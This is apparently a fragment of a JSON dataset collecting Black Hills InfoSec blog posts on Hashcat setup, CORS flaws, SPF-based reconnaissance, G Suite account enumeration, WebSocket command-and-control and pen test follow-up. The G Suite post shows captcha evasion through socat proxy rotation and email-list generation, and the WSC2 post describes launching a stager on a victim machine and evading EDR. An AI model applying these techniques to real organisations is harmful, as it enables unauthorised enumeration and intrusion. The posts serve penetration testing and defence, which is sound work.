Ivan Ristic from Qualys SSL Labs contains all of the details you could want: https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices\nConclusion\nOn most modern hosts, correction of SSL/TLS issues isn\u2019t a monumental task. Care does have to be taken to ensure that service degradation is avoided on especially sensitive systems. You can also take alternative approaches for systems that you don\u2019t have the time or resources to address as well. We haven\u2019t identified an exhaustive list, but thinking about isolating those systems from the rest of \u201cthe herd\u201d should get your creative juices flowing.\nAnd if all else fails...you can just do this.\n\nhttps://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.sec.doc/q009940_.htm\nhttps://docs.vmware.com/en/VMware-Horizon-7/7.1/com.vmware.horizon-client-agent.security.doc/GUID-FC2EB030-4D0F-4AA6-9273-0F14A67ADC73.html\nhttps://support.microsoft.com/en-us/help/4040243/how-to-enable-tls-1-2-for-configuration-manager\nhttps://support.microsoft.com/en-us/help/245030/how-to-restrict-the-use-of-certain-cryptographic-algorithms-and-protoc\nhttps://www.ssllabs.com/ssltest/\nhttps://httpd.apache.org/docs/2.4/ssl/ssl_howto.html\nhttps://raymii.org/s/tutorials/Strong_SSL_Security_On_nginx.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hashcat 4.10 Cheat Sheet v 1.2018.1\"\nTaxonomies: \"Author, External/Internal, How-To, Informational, InfoSec 201, Kent Ickler, Password Cracking, Wireless, Cheat Sheet, Cracking, dictionary, Hashcat, Hashing, Jordan Drysdale, Password cracking\"\nCreation Date: \"Fri, 15 Jun 2018 14:51:04 +0000\"\nKent Ickler //\n\nIt seemed like we were always cross-referencing the Hashcat Wiki or help file when working with Hashcat. We needed things like specific flags, hash examples, or command syntax.\n\nWe\u2019ve generated a Hashcat Cheat Sheet for quick reference that may save you a bunch of time if you\u2019re often reaching out to the Wiki or Helpfile. \n\nWe welcome feedback too, we want to give back to the InfoSec community.  If you have suggestions for this cheat sheet, let us know! @BHInfoSecurity\n\nTake a look and keep it handy: \n\nhttps://www.blackhillsinfosec.com/wp-content/uploads/2020/09/HashcatCheatSheet.v2018.1b.pdf\n\nBHIS Links:\n\nHashcat Blog Posts: https://www.blackhillsinfosec.com/?s=hashcat\n\nExternal Links: \n\nHashcat: https://hashcat.net/hashcat\n\nGitHub: https://github.com/hashcat/hashcat\n\nCrackstation: https://crackstation.net\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"CORS Lite\"\nTaxonomies: \"Informational, Web App, CORS, Cross Origin Request Sharing, Web App\"\nCreation Date: \"Thu, 21 Jun 2018 13:30:48 +0000\"\nDakota Nelson//\n\nCross Origin Request Sharing (CORS) is complicated, and that complexity creates a lot of places where security vulnerabilities can sneak in. This article will give you a \u201clite\u201d overview of CORS, with a focus on security vulnerabilities that we see most frequently on tests. This isn\u2019t intended to be a full CORS primer - if you\u2019re interested in really diving in, there\u2019s a resources section at the end that will help you get started.\n\nCORS has many facets, so let\u2019s cover a few of the more common cases one by one and see what can go wrong.\n\nThe most basic part of the CORS specification is the \u201cAccess-Control-Allow-Origin\u201d header, the basis around which everything else is built. This header informs the browser what origins are allowed to access a particular resource. Put another way, if the JavaScript in your webapp (which the user\u2019s browser loaded at app.example.com) makes a request to api.example.com, that request is cross-origin, and by default will be denied (i.e. the browser won\u2019t issue the request, or will ignore the result from the request) unless api.example.com returns an \u201cAccess-Control-Allow-Origin\u201d header telling the browser that it\u2019s ok.\n\nIn all the following images, the big green thumbs-up means the scenario was a success and happened, and the big red thumbs-down means the browser refused to carry out the scenario (though it might not refuse until partway through - CORS is complicated and I\u2019m skimming over some stuff here).\n\nFor something like an API, the Access-Control-Allow-Origin header is frequently set to \u201c*\u201d, which allows any domain to make cross-origin requests to the API. This means any javascript, anywhere, can access your API. Thankfully, though, even with an Access-Control-Allow-Origin header, cross-origin requests won\u2019t transmit cookies or other authentication material, so this header by itself is actually fairly safe.\n\nThe Access-Control-Allow-Origin header doesn\u2019t usually open up security problems on its own, but it can make other problems much worse when it\u2019s added.\n\nThe big risk comes with the addition of another CORS header: Access-Control-Allow-Credentials. When this header is returned, cross-origin requests are allowed to include cookies and other authentication material. This is where problems really begin. If a user visits example.com, and example.com sets a cookie in their browser (say, after they log in), the Access-Control-Allow-Credentials header will allow that cookie to be sent by requests issued by that same browser from other domains. That means those domains can use cookies set by example.com to carry out actions on example.com, no matter who controls the javascript running on those domains!\n\nIf a request to example.com returns an Access-Control-Allow-Origin: foo.bar header and an Access-Control-Allow-Credentials: true header, then any scripts on foo.bar execute with privileges as if they were native scripts on example.com. This means that XSS vulnerabilities on foo.bar are equivalent to XSS vulnerabilities on example.com! If you\u2019re the owner of example.com, that\u2019s a lot of trust to place in the owner of another site, and you should think about it very carefully before you do.\n\nThere are a couple of protections in place to prevent accidents around the Access-Control-Allow-Credentials header because it\u2019s so dangerous. For one, it cannot be combined with Access-Control-Allow-Origin: *. Some sites get around this by just reflecting back whatever is sent in the Origin header in the Access-Control-Allow-Origin header in their response, bypassing this restriction. If you ever contemplate doing such a thing, please think very carefully about the risk you\u2019re taking on before you do. Another restriction on the Access-Control-Allow-Credentials header is on the client side - XMLHttpRequests must deliberately set a \u201cwithCredentials\u201d flag in order to request that credentials be sent, to make sure you absolutely want the browser to send cookies and other sensitive material with your cross-domain request.\n\nThese protections are kind of confusing, so I\u2019ve set up a grid below that shows the different scenarios you may find yourself in.\n\nAlong the left, you can see the headers returned by the server, while along the top you can see whether the client javascript set the \u201cwithCredentials\u201d flag. Any red box means the request was entirely denied by the browser - for instance, the first two rows are entirely red because cross-domain requests aren\u2019t allowed without the Access-Control-Allow-Origin header. In the boxes themselves, you can see whether cookies were sent by the client. If you\u2019d like to play with this more and see the exact code that created this grid, you can run this example yourself - go grab it from Github at https://github.com/DakotaNelson/cors-test-server.\n\nHere\u2019s the main takeaway, though: if you\u2019re reflecting the Origin header into your Access-Control-Allow-Origin header, and setting Access-Control-Allow-Credentials: true at the same time, any attacker able to execute malicious javascript in one of your users\u2019 browsers, no matter where that javascript is, can hijack that user\u2019s cookies set by your application and act on that user\u2019s behalf. If there\u2019s an XSS vulnerability in a site they commonly visit, the attacker is able to execute javascript in an advertisement targeted to them, or the attacker can execute javascript after phishing the user to an attacker-controlled page, it\u2019s game over if that user has a session on your application.\n\nSome applications attempt to split the difference, and validate the origin header manually instead of just reflecting it - so that e.g. anything matching \u201c*.example.com\u201d is considered \u201csafe\u201d and will be returned in the Access-Control-Allow-Origin header.\n\nDo you see the problem here? An attacker who can convince a user to visit \u201cexample.com.malicious.com\u201d (likely through phishing) can conduct the same attacks as before because that site matches the pattern! This is still better than reflecting back any arbitrary origin in the Access-Control-Allow-Origin header, but as always, validation is very tricky to get right.\n\nThere are other twists and turns to CORS, and headers we haven\u2019t covered, but the key that you need to understand is this: CORS is complicated, and any time you\u2019re considering doing anything with it, it\u2019s worth doing some research into the implications. The resources below are things I\u2019ve found useful in understanding the security implications of CORS, and if you\u2019re the hands-on type you should definitely set up the CORS test server and poke at it for a while to help you understand what\u2019s going on.\n\nGood luck, and I hope you enjoyed this CORS lite!\n\nOther resources:\n\nhttps://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\n\nhttps://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\n\nhttps://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Running HashCat on Ubuntu 18.04 Server with 1080TI\"\nTaxonomies: \"Author, Derrick Rauch, How-To, Kent Ickler, Password Cracking, Red Team, Cracking, GPU, Hash, Hashcat, NVidia, password, Red Team, setup, Ubuntu\"\nCreation Date: \"Mon, 25 Jun 2018 15:33:30 +0000\"\nDerrick Rauch and Kent Ickler // (Updated 3/22/2019)\n\nFirst, to see what our build looks like, look here: https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/\n\nWhat\u2019s next? Time for System Rebuild!\n\nFirst, you need to decide whether you need encryption, LVM, RAID, multipath, network VLANs, or network interface bonding during the installation; if you need to reuse existing partitions on your installation disks. The reason I bring these up is the main Ubuntu image offered does not include these options, so be careful what one you download. Here is the link to the option that will have these: http://cdimage.ubuntu.com/releases/18.04/release/\n\nInstalling Ubuntu 18.04\n\nNext, run through the Ubuntu installer (we are going to assume you already know how to do this). Note: there is no need to install any of the package options during the installation process.\n\nOnce the machine is running go ahead and log in.\n\nConfigure GPU Support\n\nThen, you will blacklist Nouveau (generic Nvidia driver), as it conflicts with card-specific Nvidia drivers, with the following commands:\n\nsudo bash -c \"echo blacklist nouveau > /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n\nsudo bash -c \"echo options nouveau modeset=0 >> /etc/modprobe.d/blacklist-nvidia-nouveau.conf\"\n\nsudo update-initramfs -u\n\nsudo reboot\n\nNow that the system is up and you are logged in again, add 32 bit headers for parts of the Nvidia driver setup:\n\nsudo apt-get install makesudo apt-get install gcc\n\nWe are now ready to install NVidia drivers!\n\nBrowse to site and enter info for your device: http://www.nvidia.com/Download/index.aspx\n\nSearch and then click \u201cdownload\u201d then click \u201cagree & download\u201d (jeez, we were sure the first time NVidia)\n\nIf you are not on the local system you can right-click the \u2018agree & download\u2019 button and \u2018copy link,\u2019 then run the below command to download it(no quotes needed):\n\nwget \"pastelinkhere\"\n\nNow that you have your driver downloaded from the same directory it is located in, run the following cmd:\n\nsudo  ./NVIDIA*.run\n\nAccept all defaults during the Nvidia install and make sure that it is on YES for updating x config(xorg.conf).\n\nThen you will reboot.\n\nsudo reboot\n\nDownload & Install Hashcat\n\nAfter it is back up, grab haschat from: https://hashcat.net/hashcat/\n\nIf no gui use: wget \u201cPaste link here\u201d\n\nOnce downloaded, unzip it.\n\nP7zip -d hashcat*\n\nNow you\u2019re ready to run hashcat and start cracking! Well maybe\u2026\n\nAdditional Considerations\n\nWith everything above, keep in mind hardware differences and length of use. For example, the 1080TI Founders edition GPUs have a 91C BIOS thermal throttle, but hashcat will stop at 90C causing it to thermal stop at times without using some additional switches with hashcat, so you may have to tweak settings depending on your setup.\n\nBHIS Links\n\nHashcat Blog Posts: https://www.blackhillsinfosec.com/tag/hashcat/\n\nGPU Cracker Build: https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/\n\nExternal Links:\n\nNVidia Drivers: http://www.nvidia.com/Download/index.aspx\n\nHashcat: https://hashcat.net/hashcat/\n\nHashcat Git-Repo: https://github.com/hashcat/hashcat\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Offensive SPF: How to Automate Anti-Phishing Reconnaissance Using Sender Policy Framework\"\nTaxonomies: \"Author, Blue Team, How-To, Kent Ickler, Phishing, Anti-Phising, Best Practices, Blue Team, DKIM, DMARC, Email, Filtering, Incident Response, IR, Kent Ickler, Marketing, phishing, reconnaissance, RFC 4408, Sender Policy Framework, Spam, SPF\"\nCreation Date: \"Thu, 28 Jun 2018 17:14:46 +0000\"\nKent Ickler //\n\nTL;DR: This post describes the process of building an active system to automatically recon SPF violations.\n\nDisclaimer:\n\nThere are parts of this build that might not be legal in your area. Use in the wild at your own risk. Discuss with your peeps before implementing. BHIS @Krelkci are not liable for your actions.\n\nBackground:\n\nIn our previous blog post about configuring SPF, I didn\u2019t elaborate on the awesomeness of the exist and reason mechanics. What little people, outside of SPF experts, know is that you can build a system of response automation around the use of these two mechanics. Like to read? Syntax: RFC 4408 http://www.openspf.org/RFC_4408\n\nThe exists mechanic will force a (compliant) receiving mail server to check if a specific A DNS record exists for a specific domain. While that seems interesting and all, what perhaps is more important is the use of SPF macros within the exists mechanic. It essentially allows you to pass information about the originating SMTP server from the receiving SMTP server to wherever the domain owner of the domain in the envelope\u2019s FROM field determines.\n\nHow you say?\n\nLet\u2019s look at this SPF record:\n\nv=spfc1 include:mail.youdomain.com -exists:{d}.AutoRecon.yourdomain.com -all\n\nThe receiving SMTP server does the following actions:\n\nReceive from originating mail server where the FROM field = domain\n\nCheck SPF record for mail.yourdomain.com, of origin server is found= Good, else = move on.\n\nCheck if an A DNS record exists for [ORIGINATING.MAIL.SERVER.NAME].autorecon.yourdomain.com\n\nKill everything else (-all)\n\nHere are the key points. If mail is delivered from a server that doesn\u2019t exist within the SPF headers of mail.yourdomain.com, the receiving mail server is going to attempt to check an alias record for a dynamic hostname that is built on the fly. All you have to do now is build a DNS server configured to accept DNS queries for .autorecon.yourdomain.com. and provide all queries to an auto-recon system ,and tell your global DNS provider that autorecon.yourdomain.com is authoritatively answered by your auto-recon service. Let's do it.\n\nOn the AutoRecon Service\n\nBind configured to accept queries for AutoSPF.yourdomain.com\n\nSSMTP configured to send mail\n\nGet the files:\n\ncd/opt/\n\ngit clone https://github.com/Relkci/AutoSPFRecon\n\napt-get install bind9\n\napt-get install logtail\n\napt-get install python-setuptools\n\neasy_install clic\n\neasy_install shodan\n\nSetup your BIND9 Domain -named.conf\n\nnano /etc/bind/named.conf\n\nzone \"autorecon.YOURDOMAIN.com\" {\ntype master;\nnotify no;\nfile \"/etc/bind/AutoRecon.yourdomain.com\";\n};\n\nSetup your BIND9 Domain - zone file\n\nnano /etc/bind/autospf.yourdomain.tld\n$TTL 3D\n@       IN      SOA     autorecon.ns.yourdomain.com. admin@yourdomain.com (\n199802151       ; serial, todays date + todays serial #\n21600              ; refresh, seconds\n3600              ; retry, seconds\n604800              ; expire, seconds\n30 )            ; minimum, seconds\n;\nNS      ns              ; Inet Address of name server\n;\nlocalhost       A       127.0.0.1\nns      A       IP-OF-AutoRecon\n\nRestart Bind\n\nService bind9 restart\n\nService bind9 status\n\nConfigure Bind to log DNS queries to /var/log/syslog:\n\n#below command toggles query logging, be sure it is enabled\n\nrdnc querylog\n\n#confirm it is turned on with\n\ntail -n 2 /var/log/syslog\n\nSetup your Domain DNS records\n\n**CAUTION** Setting the SPF RECORD AS BELOW WILL TELL ALL MAIL SERVERS TO REJECT YOUR EMAIL**  \n\nYou can use ?exists:autospf.yourdomain.tld mechanic which will not immediately reject email. Be sure you retain the proper parts of SPF so that you do not reject all email. The below example would be appropriate for a domain that should never send email.\n\nSee our blog post on SPF Records to create a proper SPF record for your organization.\n\nOn your TLD nameserver:Type: A         Host: autorecon.ns.yourdomain.com Value: IP-OF-AutoReconType: NS         Host: autorecon.yourdomain.com         Value: autorecon.ns.yourdomain.comType: TXT        Host: @                                                 Value: \"v=spf1 -exists:%{i}.autorecon.yourdomain.com -all\"\n\nPutting it all together:\n\nWhen a mail server receives email and the originating mail server reviews the SPF record and finds it cannot find the mail server in an include: or other mail record, it will continue until it finds the exists:%{i}.autorecon.yourdomain.com which will instruct it to replace the %{i} with the IP of the server originating the email. The server will lookup the NS record for autorecon.yourdomain.com and find that it is the autorecon.yourdomain.com service. It will query {IP}.autorecon.yourdomain.com and will not receive a valid DNS response. The Bind server on autorecon.yourdomain.com however will have logged the query in /var/log/syslog.  \n\nThe AutoReconSPF.sh script reads the syslog for those queries, runs a shodan query, and then delivers the results to an email address in question.\n\nThe AutoReconSPF.sh script can be configured to run every few minutes with crontabs.\n\nWhat Else Can it do:\n\nThis proof of concept script sets the framework in a compartmentalized and easy to edit way.  You can add your own script actions such as NMAP scans, IR events, or maybe even link it back to Fail2Ban or IPTable black-lists.\n\nExpand.  NMap, Fail2Ban, IPTables, Incident Response. Automate Lights Out.\n\nSomeone attempts to phish your staff with an email forged to be from your domain. Since your SPF records fail to authorize the originating mail server, your AutoSPFRecon system gets alerted and triggers an email, Fail2Ban blockade, and immediately the phishing server\u2019s visibility into your infrastructure goes immediately dark.\n\nRunning AutoReconSPF.sh\n\nIn this test, I have sent an email forged with a domain that had the AutoReconSPF SPF records.  The email was sent from a Digital Ocean droplet at 206.189.xxx.xxx. The receiving mail server sends a query to autospf.bhis.io and the log entry is created. AutoReconSPF.sh identifies the offending mail server's IP to shodan and sends the results to me in email. Awesome.\n\nResulting Email Delivered:\n\nLinks:\n\nGitHub: https://github.com/Relkci/AutoSPFRecon\n\nRFC: SPF that includes exists: mechanic http://www.openspf.org/RFC_4408\n\nBHIS SPF for the Masses Blog Post: https://www.blackhillsinfosec.com/how-to-configure-spfv1-explained-for-the-masses/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Free Ticket to the Most Hands-on Infosec Con\"\nTaxonomies: \"Fun & Games, Wild West Hackin' Fest\"\nCreation Date: \"Tue, 03 Jul 2018 13:20:38 +0000\"\nFor the entire month of June, we ran a contest on our Twitter with the grand prize being a free ticket to Wild West Hackin' Fest!\nWe were quick to allow a BHIS sticker or a book in place of a t-shirt as well.\nBefore we get to the winner, for those of you who are unfamiliar with Wild West Hackin' Fest, we'll give you a quick overview:\n\nWHO: Anyone interested in information security - from the n00bs to the pros!\n\nWHERE: Deadwood, SD (Never been? It's awesome!)\n\nWHEN: Thursday & Friday, October 25-26\n\nWHY: We want this conference to be the most hands-on, activity-driven con you\u2019ve been to yet! Never worked with a JTAG? You will. Never done a single thing with Software Defined Radio? You will. We will be having an SDR village and a hardware hacking village, among some other great events. The skills you learn here will be directly applicable to your job immediately when you get back to work\u2026 or home. We listened to your feedback and this year we\u2019re adding even more lab time, so you can go to as many talks as you can fit AND also do all the activities.\n\nYou can find out more information and even purchase your ticket here: https://www.wildwesthackinfest.com/\n\n \n\nNow, for the winner...\n\nCongrats Brian!!! And thank you to everyone who entered! Hopefully we'll see you all at Wild West Hackin' Fest this fall!\n\n "
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"G Suite is the Soft Underbelly of Your Environment\"\nTaxonomies: \"Red Team, G Suite, gmail\"\nCreation Date: \"Thu, 19 Jul 2018 14:02:43 +0000\"\nMatthew Toussain//*\n\nWouldn't you like to START your pentests knowing every username for all individuals in your target environment? Gmail, G Suite, Outlook Web Access, Exchange Web Services... Email. A divine gift issued to hackers with no statute of limitations. In this blog we explore an exploitation workflow using new features of the MailSniper toolkit.\n\nWhat happens if you browse to mail.google.com and trying logging in as: matt@blackhillsinfosec.com?\nIt turns out that Google automatically attempts to authenticate you to a G Suite instance associated with the domain blackhillsinfosec.com. Since BHIS has one... this works. What happens if, instead, you tried logging on as blahblah@blackhillsinfosec.com?\n\nNo dice, interesting. As you can see from the above image Google responds differently to email accounts that exist versus those that do not. It performs this check without even attempting authentication. In our role as penetration testers, this information response is exceptionally useful. It means that we can discover valid user emails without knowing ANYTHING except the domain name.\nThere is, however, one pesky problem. Captchas.\n\nAfter a few unsuccessful attempts Google presents us with a captcha to verify our humanity. Fortunately for us, humanity can be scripted.\n\nAs with everything in information security, overcoming a hurdle is just a matter of diving deeper. In this case we turn to the wire.\nIf differences in error responses is what allows us to determine whether an account exists, what would be indicated by differences in responses when a captcha is presented? That's right captcha / no captcha. We can look for these differences with the Burp Suite intercepting proxy.\n\nIn Burp Suite we can see a get request for captcha, but what is most interesting to use is the return response to our POST requests. A POST request is made for each email \"lookup\" request. As you can see a captcha was requested after the sixth consecutive \"bad\" POST request.\nComparing this response to an incorrect, but captcha-less response we can key in on the \"gf.alr\" JSON name/value pair. The value of this object changes! For every captcha the ALR value is a 5 whereas each bad email request returns a 7. Bypassing captchas could be as simple as detecting an ALR of 5 and retrying until an ALR of 7 is received again.\n\nWhen we examine many responses across a wide number of request/response types, we can see that this differentiation remains constant yet predictable:\n\n1 -> Correct Email Address\n7 -> Incorrect Email Address\n5 -> Captcha Presented\n\nThere are even other factors (like 2FA) that can be enumerated using this mechanism.\n\nAwesome! That said, waiting for captchas to go away is lame. What else could we try?\nWhen we detect a captcha, what happens if we send the next request from a different IP address?\nNo captcha.\nUsing _socat_ we can setup socks proxy hosts to bounce and rotate our guesses.\nsocat TCP-LISTEN:9090,fork SOCKS4A:127.0.0.1:accounts.google.com:443,socksport=9999\n \nIf we combine all of these features and create a list of potential email addresses we can enumerate users. Let's look at an example of this performed against BHIS!\n\nWhat if we do not know the email addresses ahead of time? With some clever scripting an US Census data we can overcome this limitation.\nEmails generally come in one of several overarching formats:\n\nFormat\n\n    Example\n\nfirstname@domain.com\n\n    matt@blackhillsinfosec.com\n\nfirstname.lastname@domain.com\n\n    matthew.toussain@blackhillsinfosec.com\n\nfirstinitial.lastname@domain.com\n\n    mtoussain@blackhillsinfosec.com\n\n \nBy taking the top 1000 boy and girl names from census data and combining them with the most common US surnames we can generate email address permutations. Next, let's examine this accomplished with PowerShell.\nFirst download a list of firstnames and lastnames:\nPS C:\\> git clone https://github.com/0sm0s1z/email-generator.git\n\nPS C:\\> cd email-generator\n \nNow use PowerShell to craft a custom email list based on the desired format:\nGet-Content .\\firstnames.txt | % { $fname = $_; Get-Content .\\lastnames.txt | % {$fname + '.' + $_ + '@blackhillsinfosec.com'}}\n \nEmail is a key component of the penetration tester\u2019s toolkit. This will continue as long as password-based authentication remains the gatekeeper of system or network security. The fundamental problem here is not necessarily Gsuite or Outlook Online, though there is certainly more they can do. The primacy of passwords unshackles the network adversary. As penetration testers we need to demonstrate these problems to engender a more secure future for us all.\n____________________________________________________________________\n*This blog post is a follow up to Matt's webcast, which is available to watch here:\nhttps://www.blackhillsinfosec.com/webcast-testing-g-suites-with-mailsniper/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Scout2 Usage: AWS Infrastructure Security Best Practices\"\nTaxonomies: \"Author, Blue Team, How-To, Jordan Drysdale, Amazon Web Services, AWS, Best Practices, Blue Team, Jordan Drysdale, Scout2\"\nCreation Date: \"Mon, 23 Jul 2018 14:44:56 +0000\"\nJordan Drysdale//\n\nFull disclosure and tl;dr: The NCC Group has developed an amazing toolkit for analyzing your AWS infrastructure against Amazon\u2019s best practices guidelines.\n\nStart here:\n\nhttps://github.com/nccgroup/Scout2\n\nThen, access your AWS console as a user with privilege enough to create an \u201cauditor\u201d account (best practice tip #1: once your admin accounts are online and MFA enabled, never use the root account).\n\nCreate a user.\n\nCreate a group like the following and enable the SecurityAudit role for this user.\n\nReview this user account.\n\nDownload the .csv with your access keys.\n\nWe are just about ready to run Scout2!!! I cloned the repo in to /opt/, so head over to whichever directory you are using and execute the \u2018pip install -r requirements.\u2019 The --help flag lists the following.\n\nBecause AWS is driven by programmatic functions, you need not specify anything more than the credentials file we downloaded earlier to run Scout2.\n\nAfter we let Scout2 do its thing, we end up with a highly functional HTML report.\n\nThen, we can drill down as to the \u2018why\u2019 of our failures to implement best practices. AWS security best practices are documented here: https://d0.awsstatic.com/whitepapers/compliance/AWS_Auditing_Security_Checklist.pdf\n\nThis tool should be a part of your AWS deployment. It is easy to run and provides guidance to make just about any environment more secure.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Command and Control with WebSockets WSC2\"\nTaxonomies: \"C2, Craig Vincent, Red Team, C2, command and control, Red Team, WebSockets, WSC2\"\nCreation Date: \"Thu, 26 Jul 2018 14:21:26 +0000\"\nCraig Vincent//\n\nThis all started with a conversation I was having with a few other BHIS testers. At the time, I was testing a web application that used WebSockets. The app was giving me headaches, and I was venting my frustration. Penetration testers, red teams, and baddies are always looking for new ways to sneak by defenses. So, it wasn\u2019t surprising that the conversation shifted to discussing how these struggles could be used in an offensive capacity. Someone mentioned that it would be super cool to have a command and control (C2) channel that used WebSockets. Before we get into why that would be super cool, we should take a closer look at the WebSocket protocol.\n\nWebSocket isn\u2019t all that new. The protocol originally showed up in HTML5 in the mid to late 2000s. It gained traction with developers, started shipping with browsers, and the specification (RFC 6455) was finalized in 2011. The WebSocket protocol facilitates a full-duplex communication channel between the server and the client over TCP. This allows for true asynchronous communication between the client and the server. This is a big break from the request/response nature of the HTTP protocol. Before WebSocket, the most popular way to achieve \u201casynchronous\u201d communication was to use AJAX. Except AJAX still depends on the client to poll the server, so it\u2019s really just half-duplex. WebSockets allow the server to send messages to the client at will and vice versa.\n\nTracking the flow of asynchronous communication is a little harder than tracking the flow of traditional HTTP requests and responses. Also, the format of the data sent using WebSockets is almost completely specified by the application developer. As I found out, these factors can make testing applications that use WebSockets more challenging. This also means more work for defenders who need to inspect web traffic! So, the idea is that we can use WebSockets to establish a command and control channel that might not be given as much scrutiny.\n\nFortunately, @Arno0x0x is way ahead of us on this and wrote a tool called WSC2 which is available on GitHub at https://github.com/Arno0x/WSC2. There is also a great blog post introducing the tool: https://arno0x0x.wordpress.com/2017/11/10/using-websockets-and-ie-edge-for-c2-communications/.\n\nSo let\u2019s take WSC2 for a spin! The tool comes almost ready to use as soon as you clone it to your attack server. Details like the IP address of the C2 server are managed in a configuration file called config.py. I did make a couple of modifications to this file like configuring the callback to point to my command and control server and setting a new password.\n\nOnce launched, I found the controller component of WSC2 to be intuitive and similar to other C2 applications I\u2019ve used in the past. WSC2 comes with several stager payloads, but I decided to use the PowerShell one-line stager to launch an agent on my Windows 10 victim machine. Because the callback configuration had already been handled in a separate file, generating the payload was as quick as launching the WSC2 controller and typing \u201cgenStager psoneliner\u201d. All that was left to do was run the PowerShell one-liner on my victim machine. I was immediately rewarded with an agent callback! The following screenshot shows the entire process form the controller point of view.\n\nThe WSC2 agent itself isn\u2019t packed with a ton of features. It does let you upload and download files to/from the victim machine as well as drop into a shell and execute commands on the remote host. \n\nOne of the interesting things about the WSC2 agent is that it communicates with the C2 server through Internet Explorer/Edge using a COM object. @Arno0x0x threw that in for EDR evasion, and I thought it was cool. For demonstration purposes, I ran Process Monitor (part of Windows\u2019 Sysinternals Suite) on my victim machine to watch processes that were participating in network communications while the agent was running. Sure enough, all of my agent traffic showed up as IEXPLORE.EXE.\n\nI configured Internet Explorer to proxy traffic through Burp Suite on the victim side. This allowed me to see the connection upgrade from HTTP to WebSocket.\n\nWe can also use Burp Suite to view the WebSocket traffic generated when commands are issued to the agent.\n\nUsing WebSockets for command and control is something that should be considered by penetration testers, red teams, and defenders alike. WSC2 makes establishing a WebSocket command and control channel in your environment to test your monitoring and defense solutions quick and easy.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What to Expect After a Pen Test\"\nTaxonomies: \"Blue Team, Finding, General InfoSec Tips & Tricks, How-To, Informational, after the pen test, how to deal with you penetration test results, What to do after a penetration test, what to do after a pentest\"\nCreation Date: \"Thu, 02 Aug 2018 13:51:18 +0000\"\nScott Worden* //\nSo you and your company had a pen test\u2026now what? What to do, how to plan, and good SQUIRREL! ways to stay on track.\n\n \nThe 3 Stage of the Penetration Test\n\nThe TESTER\n\nThe TESTED\n\nHaving the penetration tester reach your crown jewels, get root, own you, pwn you, own3d, 0wn3d, pwned, pooned or whatever phrasing you use is NOT a failure. The point of a penetration test is to find where you are vulnerable so you can improve. There is no failing a pen test, with two exceptions. If you artificially insert preventions or react differently to the pen tester, you fail. If the same fixable finding shows up on multiple pen tests, you fail.\n\nYour Penetration Test Is Done, Now What?\nWhat do you do now? If you had a pen test just to check a compliance box or say that you had one, you are done. Bury that head deeper in the sand (even though, eventually it has to and will come out the other side). If your pen test has no findings, well, did you have an actual pen test or a vulnerability assessment? Were the people that performed the pen test competent? Did you let them test realistically? If yes to all that, then contact me, I have much to learn from you.\nFor the rest of us it is time to stop commiserating, put down the adult beverage and get to work. The following comes from my own experience, what I have seen and what has worked for me. It might not match with your scenario, the opinions of the company I work for, or of those with whom I work, but hopefully there are a few nuggets of wisdom you can extract.\n\n \n\nRead That Report\nSince the point of a pen test is to improve, the report needs to be actionable. Do you understand the findings? Can you recreate them? If not, contact the tester. They do not have to give you their secret sauce, there is a reason you pay them to do what they do, but they should be willing to share with you the basics so you can at least, partially, recreate the findings in your own environment.\n \n\nMake That Plan\nNext step is develop plans. Most of you are probably doers and want to jump right to making changes. No issue with that as long as you do not lose sight of the bigger goals: reacting to all the findings, improving security, and keeping systems usable. You might have a great idea how to prevent a certain technique only to have it also prevent the business from doing their job.\n\nFor findings you know how to mitigate, the plan is as simple as how to prevent (if possible) and detect. If you are not sure how to mitigate a finding then the plan is to perform research based on that to create a mitigation plan. Easy. Every finding should have a plan with a priority and if possible be assigned to someone with a due date. Do not stop at mitigating just one finding thinking, \"Well, since I blocked how they got in we are good.\" Any one prevention technique will only be bypassed by malicious actors as well as pen testers. Finally, put the plans and tasks in so that you can track to ensure they are done. Remember one of the ways to fail a pen test?\n \n\nMade Plans, Time to Make Changes\nGreat, you have plans, time to start making changes\u2026well maybe not. Do you have time to work on them? Do you need resources from other teams? Is there business impact? You need buy in from management, the people directly impacted and the people that will implement the changes. What seems to work is presenting the pen test results. For management, that might just be the report. For more technical people, walk through what the pen tester did. Show the steps, and how easy it was for the pen tester to gather tokens, move around the environment, etc. This tends to make more sense to technical people than just a report. In the end, a demonstration is worth a thousand words. Some companies might be apprehensive about showing their flaws and vulnerabilities; i.e. want to hide the findings in order to give the appearance of being more secure. To me, the benefits you get from demonstrating the findings to people affected by them or that can help you fix them far outweigh the risk. It\u2019s amazing how these types of presentations have garnered interest and backing where I work. The more people you get interested in improving the security of your company the easier your job will be (or much much harder).\nYou might not like presenting, few people do, but this is your chance to shine, get buy in for the findings as well as try to get people interested in security. You will be presenting about something you (should and hopefully) enjoy. You might be surprised and enjoy the experience. Word of caution though, do not blow smoke. They will know. If you do not know something say so, and get back to them.\n\n \n\nStart Small to Go Big\nGreat, now you can start making changes\u2026well maybe not. There might be some plans that will require a lot of work and resources or have a large impact on the business causing management or other teams to balk at implementing them. One way to handle this is break the plan up into smaller tasks that are more actionable. Can't change the length of all your passwords? What about just the critical ones (you do know them, correct?), IS, or just the Security Team (eat your own dog food!)?  Trying to implement MFA? Same thing, start small, implement just for the critical scenarios then build upon your success. With each successful implementation the hesitancy should decrease. Whatever you do, once you start keep making progress, don't let it drop.\n \n\nIs That a Squirrel?!\nNot letting things drop is imperative. I have found the 